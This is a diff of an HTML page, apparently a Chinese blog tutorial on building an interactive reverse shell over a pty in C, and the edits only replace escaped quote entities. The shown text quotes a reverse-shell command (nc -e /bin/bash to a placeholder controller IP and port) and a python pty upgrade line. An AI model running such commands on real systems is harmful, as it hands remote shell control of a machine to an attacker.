@@ -71,9 +71,9 @@
       </details>
       
     </aside>
-    <p>在网上能看到一堆的反弹 Shell 方法，最常见的就是先用 <code>nc -e /bin/bash $控制机IP $控制机端口</code> 弹出一个 Shell，然后再用 <code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code> 这样来升级成交互式 Shell。这样的话得保证环境里有 nc + python，或者得在被控机上下载多个文件。这样的话，还不如直接自己写一个 Shell 呢 233。</p>
+    <p>在网上能看到一堆的反弹 Shell 方法，最常见的就是先用 <code>nc -e /bin/bash $控制机IP $控制机端口</code> 弹出一个 Shell，然后再用 <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code> 这样来升级成交互式 Shell。这样的话得保证环境里有 nc + python，或者得在被控机上下载多个文件。这样的话，还不如直接自己写一个 Shell 呢 233。</p>
 <h2 id="“可交互_Shell”_的原理">“可交互 Shell” 的原理</h2>
-<p>现在常见的“终端模拟器”，例如 KDE 的 Konsole, MACos 上的 iterm，服务器上的 SSH，都是使用 &quot;pty&quot; 来实现的。而我们反弹的 Shell 则不一样，所以无法交互。</p>
+<p>现在常见的“终端模拟器”，例如 KDE 的 Konsole, MACos 上的 iterm，服务器上的 SSH，都是使用 "pty" 来实现的。而我们反弹的 Shell 则不一样，所以无法交互。</p>
 <p>而 pty 则是模拟终端的设备。平时使用的终端模拟器是和 pty master 进行沟通，而里面的 shell 是和 pty slave 进行沟通，两者通过 pty 进行沟通。</p>
 <pre data-lang="txt" class="language-txt z-code"><code class="language-txt" data-lang="txt"><span class="z-text z-plain">终端模拟器 &lt;=&gt; | pty master | pty | pty slave | &lt;=&gt; shell
 </span></code></pre>
@@ -81,7 +81,7 @@
 <pre data-lang="txt" class="language-txt z-code"><code class="language-txt" data-lang="txt"><span class="z-text z-plain">终端模拟器 &lt;=&gt; 控制端 &lt;=(socket 通信)=&gt; 被控端 &lt;=&gt; | pty master | pty | pty slave | &lt;=&gt; shell
 </span></code></pre>
 <h2 id="代码实现">代码实现</h2>
-<p>首先是导入相关文件，&quot;pty.h&quot; 包含 pty 相关函数的定义，而 &quot;select.h&quot; 则是用来处理异步通信的。</p>
+<p>首先是导入相关文件，"pty.h" 包含 pty 相关函数的定义，而 "select.h" 则是用来处理异步通信的。</p>
 <pre data-lang="c" class="language-c z-code"><code class="language-c" data-lang="c"><span class="z-source z-c"><span class="z-meta z-preprocessor z-include z-c"><span class="z-keyword z-control z-import z-include z-c">#include</span> <span class="z-string z-quoted z-other z-lt-gt z-include z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&lt;</span>pty.h<span class="z-punctuation z-definition z-string z-end z-c">&gt;</span></span>
 </span></span><span class="z-source z-c"><span class="z-meta z-preprocessor z-include z-c"><span class="z-keyword z-control z-import z-include z-c">#include</span> <span class="z-string z-quoted z-other z-lt-gt z-include z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&lt;</span>sys/select.h<span class="z-punctuation z-definition z-string z-end z-c">&gt;</span></span>
 </span></span><span class="z-source z-c"><span class="z-meta z-preprocessor z-include z-c"><span class="z-keyword z-control z-import z-include z-c">#include</span> <span class="z-string z-quoted z-other z-lt-gt z-include z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&lt;</span>unistd.h<span class="z-punctuation z-definition z-string z-end z-c">&gt;</span></span>
